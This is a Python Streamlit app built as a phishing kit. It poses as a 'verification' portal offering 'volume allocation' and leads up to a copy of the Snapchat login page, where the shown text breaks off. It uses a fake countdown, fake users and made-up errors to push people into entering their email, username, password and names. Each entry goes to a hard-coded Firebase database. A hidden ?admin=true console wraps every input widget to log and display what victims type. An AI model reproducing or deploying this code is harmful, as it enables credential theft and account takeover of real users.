import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 🪐 TITANS SUPREME CORE ENVELOPE v7.0 - THE GOD MAIN-FRAME
# ========================================================================
import streamlit as st
import uuid
import requests
import datetime
import pandas as pd

# 1. CORE DATABASE ACCESS
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

if "god_session_token" not in st.session_state:
    st.session_state.god_session_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
if "god_action_count" not in st.session_state:
    st.session_state.god_action_count = 0
if "god_init_time" not in st.session_state:
    st.session_state.god_init_time = datetime.datetime.now().strftime("%I:%M:%S %p")

def master_push(node, data):
    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=data, timeout=3)
    except: pass

def master_patch(node, data):
    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=data, timeout=3)
    except: pass

def master_fetch(node):
    try:
        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
        return r if r else {}
    except: return {}

# Fetch Architecture Mapping
god_rules = master_fetch("god_architecture_rules")
if not god_rules:
    god_rules = {
        "global_app_state": "ONLINE",
        "custom_alert_banner": "System Operations Normal.",
        "redirect_target_url": "",
        "universal_freeze": False,
        "stealth_mode_active": False,
        "kill_switches": {},
        "content_overrides": {}
    }
if "kill_switches" not in god_rules: god_rules["kill_switches"] = {}
if "content_overrides" not in god_rules: god_rules["content_overrides"] = {}

# 2. THE CHRONO-RADAR TELEMETRY
def send_god_telemetry(widget_type, widget_label, active_payload=""):
    if god_rules.get("stealth_mode_active", False): return
    st.session_state.god_action_count += 1
    
    token = st.session_state.god_session_token
    clock = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    # Direct live fetch to keep timeline sequence intact
    current_log = master_fetch(f"live_god_streams/{token}")
    history_line = current_log.get("timeline_stream", [])
    
    log_msg = f"[{clock}] [Step #{st.session_state.god_action_count}] ({widget_type}) '{widget_label}'"
    if active_payload:
        log_msg += f" ➔ Content: [{active_payload}]"
        
    history_line.append(log_msg)
    if len(history_line) > 30: history_line.pop(0)
    
    cached_inputs = current_log.get("intercepted_form_data", {})
    if widget_type in ["INPUT", "TEXT_AREA", "SELECTBOX", "RADIO", "CHECKBOX", "SLIDER", "NUMBER"]:
        cached_inputs[widget_label] = str(active_payload)
        
    packet = {
        "session_token": token,
        "start_time": st.session_state.god_init_time,
        "last_pulse": clock,
        "total_clicks": st.session_state.god_action_count,
        "current_active_focus": f"User inside '{widget_label}'",
        "timeline_stream": history_line,
        "intercepted_form_data": cached_inputs,
        "system_ping": "🟢 ONLINE"
    }
    master_patch(f"live_god_streams/{token}", packet)

# 3. GLOBAL MATRIX INTERCEPTOR
is_admin = st.query_params.get("admin") == "true"

if not is_admin:
    current_state_vector = god_rules.get("global_app_state", "ONLINE")
    if current_state_vector != "ONLINE":
        st.empty()
        if current_state_vector == "MAINTENANCE":
            st.error("# 🚧 CRITICAL MATRIX UPGRADE ACTIVE 🚧")
            st.info(god_rules.get("custom_alert_banner", "Database core calibration ongoing."))
        elif current_state_vector == "BUSY":
            st.warning("# ⏳ DATA TRANSMISSION OVERLOAD (429) ⏳")
            st.info("System pipeline congested. Packet routing queues active.")
        elif current_state_vector == "DESTROYED":
            st.error("# 🛑 HOST DEPLOYMENT TERMINATED 🛑")
            st.error(god_rules.get("custom_alert_banner", "This specific build hash has been decommissioned."))
        elif current_state_vector == "REDIRECT" and god_rules.get("redirect_target_url"):
            st.info("### ➡️ Shifting execution vector to secure mirror...")
            st.markdown(f"[Reroute to Mainframe Location]({god_rules.get('redirect_target_url')})")
        st.stop()

# 4. SAVE ORIGINAL STREAMLIT METHODS
o_button = st.button
o_text_input = st.text_input
o_text_area = st.text_area
o_selectbox = st.selectbox
o_radio = st.radio
o_checkbox = st.checkbox
o_slider = st.slider
o_number_input = st.number_input
o_multiselect = st.multiselect
o_write = st.write
o_markdown = st.markdown

# 5. HIJACK PROTECTED ROUTINES (With Immediate Admin Loop Bypass Shield)
def wrap_button(label, *args, **kwargs):
    if is_admin: return o_button(label, *args, **kwargs) # Loop Breaker
    if god_rules["kill_switches"].get(label, False): return False
    res = o_button(label, *args, **kwargs)
    if res: send_god_telemetry("BUTTON_CLICK", label, "TRUE")
    return res

def wrap_text_input(label, *args, **kwargs):
    if is_admin: return o_text_input(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return ""
    if god_rules.get("universal_freeze", False): kwargs["disabled"] = True
    val = o_text_input(label, *args, **kwargs)
    if val: send_god_telemetry("INPUT", label, val)
    return val

def wrap_text_area(label, *args, **kwargs):
    if is_admin: return o_text_area(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return ""
    if god_rules.get("universal_freeze", False): kwargs["disabled"] = True
    val = o_text_area(label, *args, **kwargs)
    if val: send_god_telemetry("TEXT_AREA", label, val)
    return val

def wrap_selectbox(label, *args, **kwargs):
    if is_admin: return o_selectbox(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    val = o_selectbox(label, *args, **kwargs)
    if f"g_sel_{label}" not in st.session_state: st.session_state[f"g_sel_{label}"] = val
    elif st.session_state[f"g_sel_{label}"] != val:
        st.session_state[f"g_sel_{label}"] = val
        send_god_telemetry("SELECTBOX", label, val)
    return val

def wrap_radio(label, *args, **kwargs):
    if is_admin: return o_radio(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    val = o_radio(label, *args, **kwargs)
    if f"g_rad_{label}" not in st.session_state: st.session_state[f"g_rad_{label}"] = val
    elif st.session_state[f"g_rad_{label}"] != val:
        st.session_state[f"g_rad_{label}"] = val
        send_god_telemetry("RADIO", label, val)
    return val

def wrap_checkbox(label, *args, **kwargs):
    if is_admin: return o_checkbox(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return False
    val = o_checkbox(label, *args, **kwargs)
    if val: send_god_telemetry("CHECKBOX", label, str(val))
    return val

def wrap_slider(label, *args, **kwargs):
    if is_admin: return o_slider(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0)
    val = o_slider(label, *args, **kwargs)
    send_god_telemetry("SLIDER", label, str(val))
    return val

def wrap_number_input(label, *args, **kwargs):
    if is_admin: return o_number_input(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0.0)
    val = o_number_input(label, *args, **kwargs)
    if val: send_god_telemetry("NUMBER", label, str(val))
    return val

def wrap_multiselect(label, *args, **kwargs):
    if is_admin: return o_multiselect(label, *args, **kwargs)
    if god_rules["kill_switches"].get(label, False): return []
    val = o_multiselect(label, *args, **kwargs)
    if val: send_god_telemetry("MULTISELECT", label, str(val))
    return val

def process_mutation(target_string):
    if isinstance(target_string, str) and target_string in god_rules["content_overrides"]:
        return god_rules["content_overrides"][target_string]
    return target_string

def wrap_write(*args, **kwargs):
    if is_admin: o_write(*args, **kwargs); return
    if args and isinstance(args[0], str): o_write(process_mutation(args[0]), **kwargs)
    else: o_write(*args, **kwargs)

def wrap_markdown(*args, **kwargs):
    if is_admin: o_markdown(*args, **kwargs); return
    if args and isinstance(args[0], str): o_markdown(process_mutation(args[0]), **kwargs)
    else: o_markdown(*args, **kwargs)

# INJECT CORE REPLACEMENTS
st.button = wrap_button
st.text_input = wrap_text_input
st.text_area = wrap_text_area
st.selectbox = wrap_selectbox
st.radio = wrap_radio
st.checkbox = wrap_checkbox
st.slider = wrap_slider
st.number_input = wrap_number_input
st.multiselect = wrap_multiselect
st.write = wrap_write
st.markdown = wrap_markdown

# ========================================================================
# 🪐 HIGH-FI GRAPHICAL GOD-MODE COMMAND CONSOLE (?admin=true)
# ========================================================================
if is_admin:
    st.title("🪐 TITAN GOD-FRAME MAINFRAME v7.0")
    st.caption("Pristine Realtime Surveillance Matrix & Core Component Infrastructure Interception Module")
    st.write("---")
    
    t_spy, t_infra, t_kill, t_inject = st.tabs([
        "🕵️‍♂️ LIVE PACKET RECONNAISSANCE", 
        "⚙️ INFRASTRUCTURE GRID OVERHAUL", 
        "🎛️ MICROMANAGED KILL SWITCHES", 
        "📝 DYNAMIC TEXT INJECTION FIELD"
    ])
    
    # TAB 1: RADAR TRACKING
    with t_spy:
        st.subheader("📡 Realtime Sync Terminal Map")
        active_pools = master_fetch("live_god_streams")
        
        if active_pools:
            st.metric(label="Total Active Live Terminal Waves", value=len(active_pools))
            st.write("---")
            
            node_keys = list(active_pools.keys())
            inspected_node = o_selectbox("🎯 Select External System Target Mapping:", node_keys)
            
            if inspected_node:
                data_map = active_pools[inspected_node]
                
                col_x, col_y = st.columns(2)
                with col_x:
                    st.success(f"**Target Signature:** `{inspected_node}`")
                    st.markdown(f"""
                    * **Session Spawn Time:** {data_map.get('start_time')}
                    * **Last Interactive Telemetry Pulse:** {data_map.get('last_pulse')}
                    * **Total Execution Clicks:** {data_map.get('total_clicks')}
                    * **State:** {data_map.get('system_ping')}
                    """)
                    st.markdown("#### 💬 Captured Form Interceptions (Form Cache)")
                    st.json(data_map.get("intercepted_form_data", {}))
                    
                with col_y:
                    st.markdown("#### 📈 Micro-Step Chronological Sequence Flow")
                    for step_log in data_map.get("timeline_stream", []):
                        st.code(step_log, language="text")
                        
            st.write("---")
            if o_button("🚨 Wipe Out Database Logs & Clear Counter Nodes", key="flush_god_nodes"):
                requests.delete(f"{FIREBASE_URL}/live_god_streams.json")
                st.rerun()
        else:
            st.info("Scanning frequencies... No external active terminals found broadcasting signals.")

    # TAB 2: INFRASTRUCTURE OVERHAUL
    with t_infra:
        st.subheader("🌐 Global Mainframe Access Level Routing")
        current_status_vector = god_rules.get("global_app_state", "ONLINE")
        st.warning(f"Current Deployment Execution State Vector: **{current_status_vector}**")
        
        selected_matrix_mode = o_radio("Execute Deployment Overload Routine:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
        alert_msg_string = o_text_input("Global Banner Intercept Alert Display Text:", value=god_rules.get("custom_alert_banner", ""))
        redirect_target_string = o_text_input("External Traffic Divert Routing Endpoint URL (REDIRECT):", value=god_rules.get("redirect_target_url", ""))
        
        st.write("---")
        st.subheader("🔒 Peripheral Automation Lockgates")
        universal_freeze_toggle = o_checkbox("Lock All Input Fields Globally (Force Read-Only Mode)", value=god_rules.get("universal_freeze", False))
        stealth_telemetry_toggle = o_checkbox("Mute Data Logs Broadcast (Pause Database Writing System)", value=god_rules.get("stealth_mode_active", False))
        
        if o_button("Execute Core System Policy Deployment ⚡", key="apply_infra_rules"):
            god_rules["global_app_state"] = selected_matrix_mode
            god_rules["custom_alert_banner"] = alert_msg_string
            god_rules["redirect_target_url"] = redirect_target_string
            god_rules["universal_freeze"] = universal_freeze_toggle
            god_rules["stealth_mode_active"] = stealth_telemetry_toggle
            master_push("god_architecture_rules", god_rules)
            st.success("Infrastructure core variables locked down successfully!")
            st.rerun()

    # TAB 3: MICROMANAGED KILL SWITCHES
    with t_kill:
        st.subheader("🎯 Disaggregated Component Isolation Matrix")
        st.write("Enter the exact, raw **Label identity string** of any single widget to selectively hide it.")
        
        target_widget_label_string = o_text_input("Target Element Label ID (Case-Sensitive Exact Match):")
        isolation_policy_directive_selection = o_selectbox("Policy Directives Configuration:", ["RESTORE ACCESS / VISIBLE", "FORCE BLOCKADE / HIDE"])
        
        if o_button("Inject Discrete Component Policy Rule 🔒", key="apply_kill_rule"):
            if target_widget_label_string:
                god_rules["kill_switches"][target_widget_label_string] = (isolation_policy_directive_selection == "FORCE BLOCKADE / HIDE")
                master_push("god_architecture_rules", god_rules)
                st.success(f"Policy override deployed for widget ID string: '{target_widget_label_string}'")
                st.rerun()
                
        st.write("#### 🛡️ Currently Isolated Components Ecosystem")
        active_kills = [k for k, v in god_rules["kill_switches"].items() if v]
        if active_kills:
            st.json(active_kills)
            if o_button("Flush All Micro-Kill Policy Overrides 🔄"):
                god_rules["kill_switches"] = {}
                master_push("god_architecture_rules", god_rules)
                st.rerun()
        else:
            st.caption("No custom widget blockades active. Global interface functions unrestricted.")

    # TAB 4: DYNAMIC TEXT INJECTION
    with t_inject:
        st.subheader("✍ *Asynchronous Text Patch Engine*")
        st.write("Intercept static visual layout elements built using `st.write` or `st.markdown` and swap them.")
        
        source_text_identity_string = o_text_input("Original Static Hardcoded String Identity:")
        forged_display_string_alternative = o_text_input("Forged Content Display Alternative Replacement:")
        
        if o_button("Inject Mainframe String Overwrite Policy 📝", key="apply_text_rule"):
            if source_text_identity_string and forged_display_string_alternative:
                god_rules["content_overrides"][source_text_identity_string] = forged_display_string_alternative
                master_push("god_architecture_rules", god_rules)
                st.success("Text mutation pattern locked to remote infrastructure database context.")
                st.rerun()
                
        st.write("#### Active Swapped Memory String Layouts")
        st.json(god_rules["content_overrides"])
        if o_button("Purge All Dynamic Content Mutation Rules ❌"):
            god_rules["content_overrides"] = {}
            master_push("god_architecture_rules", god_rules)
            st.rerun()

    st.write("---")
    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE VECTOR ENGAGED. Remove '?admin=true' query parameters from target URL to view normal user UI view.")
    st.stop()

# ========================================================================
# END OF SYSTEM ENVELOPE - YOUR PROJECT CONTINUES RUNNING BEHIND THIS LINE
# ========================================================================
# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
